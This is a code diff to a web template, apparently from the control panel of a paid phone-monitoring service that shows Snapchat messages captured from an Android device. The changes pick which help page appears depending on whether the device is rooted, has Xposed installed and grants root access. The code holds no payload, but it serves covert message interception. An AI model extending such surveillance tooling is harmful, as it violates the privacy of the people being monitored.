@@ -17,6 +17,13 @@
     {if !$paid}
         {insert "cp/updatePackage.html"}
     {elseif count($accounts)}
+    
+    {if $di.currentDevice.os=='android' && (!$di.currentDevice.rooted || !$di.currentDevice.android_xposed_installed || !$di.currentDevice.rootAccess)}
+    <div class="bg-warning" style="padding: 10px 10px 1px;">
+        {insert "cp/snapchat/inc.androidMessages.htm"}
+    </div>
+    {/if}
+    
     <div class="row form-inline">
         <div class="col-lg-6 col-md-6 col-sm-6">
             <label for="account">{$di.t->_('Account')} </label>
@@ -186,10 +193,26 @@
         });
     </script>
     {else}
-        {if $di.currentDevice.os=='android' && !$di.currentDevice.rooted}
-            {include "content/{$di.t->getLocale()}/rootPhone.html"}
-        {elseif $di.currentDevice.os=='android' && $di.currentDevice.app_version > 6 && $di.currentDevice.rooted && !$di.currentDevice.rootAccess}   
-            {include "content/{$di.t->getLocale()}/rootAccessPhone.html"}    
+        {if $di.currentDevice.os=='android' && (!$di.currentDevice.rooted || !$di.currentDevice.android_xposed_installed || !$di.currentDevice.rootAccess)}
+            {if !$di.currentDevice.rooted}
+                {if $di.currentDevice.android_xposed_installed}
+                    {include "content/{$di.t->getLocale()}/rootPhone.html"}    
+                {else}
+                    {include "content/{$di.t->getLocale()}/noXposedAndRoot.html"}
+                {/if}
+            {else}
+                {if $di.currentDevice.android_xposed_installed}
+                    {if !$di.currentDevice.rootAccess}
+                        {include "content/{$di.t->getLocale()}/rootAccessPhone.html"}
+                    {/if}
+                {else}
+                    {if $di.currentDevice.rootAccess}
+                        {include "content/{$di.t->getLocale()}/noXposed.html"}
+                    {else}
+                        {include "content/{$di.t->getLocale()}/noXposedAndRootAccess.html"}
+                    {/if}
+                {/if}
+            {/if}
         {else}
             <h3>{$di.t->_('Waiting for messages... Why can the data be unavailable?')}</h3>
             {include "content/{$di.t->getLocale()}/noData.html"}
